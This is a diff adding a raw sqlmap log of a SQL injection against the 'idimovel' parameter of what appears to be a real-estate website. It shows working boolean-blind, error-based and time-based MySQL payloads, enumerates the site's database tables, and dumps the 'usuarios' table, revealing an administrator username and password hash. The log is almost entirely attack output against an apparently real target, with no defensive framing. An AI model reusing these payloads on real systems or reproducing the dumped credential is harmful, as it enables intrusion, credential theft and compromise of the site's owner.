@@ -1,0 +1,100 @@
+sqlmap identified the following injection point(s) with a total of 308 HTTP(s) requests:
+---
+Parameter: idimovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idimovel=124 AND 6924=6924
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: idimovel=124 OR (SELECT 1774 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT (ELT(1774=1774,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: idimovel=124 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] houseassessori
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idimovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idimovel=124 AND 6924=6924
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: idimovel=124 OR (SELECT 1774 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT (ELT(1774=1774,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: idimovel=124 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: houseassessori
+[8 tables]
++----------+
+| bairro   |
+| cidade   |
+| destaque |
+| fotos    |
+| imoveis  |
+| tb_pk    |
+| tipo     |
+| usuarios |
++----------+
+
+Database: houseassessori
++----------+---------+
+| Table    | Entries |
++----------+---------+
+| fotos    | 6080    |
+| imoveis  | 364     |
+| bairro   | 77      |
+| tipo     | 9       |
+| cidade   | 6       |
+| destaque | 4       |
+| tb_pk    | 2       |
+| usuarios | 1       |
++----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idimovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idimovel=124 AND 6924=6924
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: idimovel=124 OR (SELECT 1774 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT (ELT(1774=1774,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: idimovel=124 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: houseassessori
+Table: usuarios
+[1 entry]
++------------+---------------+----------------------------------------------------------------------------------------------------------------------------------+
+| id_usuario | nome_usuario  | senha_usuario                                                                                                                    |
++------------+---------------+----------------------------------------------------------------------------------------------------------------------------------+
+| 1          | administracao | e70ed0b8147d85fd7c46f4ad2a2e7a8fd37d83f8dbd4b3a7fc92e48e3c67891cf42bb6dcfe9b666dd400be5da03413dfffb998e574604dde9197d9a183fafdb8 |
++------------+---------------+----------------------------------------------------------------------------------------------------------------------------------+
+
